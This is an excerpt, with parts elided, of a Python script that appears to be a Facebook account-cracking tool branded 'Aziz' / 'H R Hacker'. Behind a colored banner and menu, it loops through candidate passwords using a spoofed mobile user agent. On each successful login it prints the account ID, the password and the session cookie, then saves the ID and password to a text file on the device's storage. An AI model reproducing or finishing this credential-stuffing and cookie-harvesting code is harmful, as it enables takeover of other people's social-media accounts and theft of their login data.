...
ha = current.day
today = date.today()
#Aziz2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mAziz')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Aziz/1.2.0 OPN-B'
...
def banner():
    clear()
    print(f"""\033[1;92m
\033[1;91m     ____  ____     _______  
\033[1;91m    |_   ||   _|   |_   __ \       
\033[38;5;208m| |__| |       | |__) |       
\033[38;5;208m|  __  |       |  __ /        
\033[1;92m     _| |  | |_  _  _| |  \ \_  _    
\033[1;92m    |____||____|(_)|____| |___|(_) 
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mAziz \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mH R Hacker \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/profile.php?id=61555074324551')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Aziz_OK.mp3")
                print('\033[1;92m[Aziz-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Aziz-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mAziz","\x1b[1;92mAziz","\x1b[1;93mAziz","\x1b[1;94mAziz","\x1b[1;95mAziz","\x1b[1;96mAziz","\x1b[1;97mAziz","\x1b[1;91mAziz","\x1b[1;92mAziz","\x1b[1;93mAziz","\x1b[1;94mAziz","\x1b[1;95mAziz","\x1b[1;96mAziz"])
